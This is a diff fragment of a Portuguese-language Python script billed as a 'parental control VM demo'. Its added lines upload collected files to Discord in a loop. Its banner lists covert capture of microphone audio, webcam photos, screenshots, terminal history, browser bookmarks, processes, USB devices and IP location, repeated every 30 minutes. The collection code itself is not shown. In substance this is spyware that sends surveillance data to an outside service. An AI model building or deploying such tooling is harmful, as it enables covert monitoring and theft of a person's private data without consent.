+    for arq in arquivos:
+        enviar_discord_arquivo(arq)
+        time.sleep(0.5)
+    
+    # Limpeza
     limpar_logs_antigos()
     
     print("\n" + "=" * 70)
-    print(f"[+] ✅ MONITORAMENTO CONCLUÍDO - {datetime.now().strftime('%H:%M:%S')}")
+    print(f"[+] ✅ MONITORAMENTO CONCLUÍDO")
     print("=" * 70 + "\n")
 
 # ==================== MAIN ====================
 if __name__ == "__main__":
     print("""
-    ╔═══════════════════════════════════════════════════════════╗
-    ║           🛡️  CONTROLE PARENTAL - VM DEMO  🛡️             ║
-    ║                                                           ║
-    ║  ⚠️  APENAS PARA DEMONSTRAÇÃO TÉCNICA EM VM              ║
-    ╚═══════════════════════════════════════════════════════════╝
+    ╔═══════════════════════════════════════════════════════════════╗
+    ║             🛡️  CONTROLE PARENTAL - VM DEMO  🛡️               ║
+    ╠═══════════════════════════════════════════════════════════════╣
+    ║  Funcionalidades:                                             ║
+    ║  • Tempo de uso do PC                                         ║
+    ║  • Captura de áudio (microfone)                               ║
+    ║  • Dispositivos USB conectados                                ║
+    ║  • Localização geográfica (via IP)                            ║
+    ║  • Processos em execução                                      ║
+    ║  • Histórico do terminal                                      ║
+    ║  • Informações do sistema                                     ║
+    ║  • Favoritos do navegador                                     ║
+    ║  • Screenshot + Foto da câmera                                ║
+    ╠═══════════════════════════════════════════════════════════════╣
+    ║  ⚠️  APENAS PARA DEMONSTRAÇÃO TÉCNICA EM VM                   ║
+    ╚═══════════════════════════════════════════════════════════════╝
     """)
     
-    # Setup inicial
     setup()
     
     # Agenda execução a cada 30 minutos
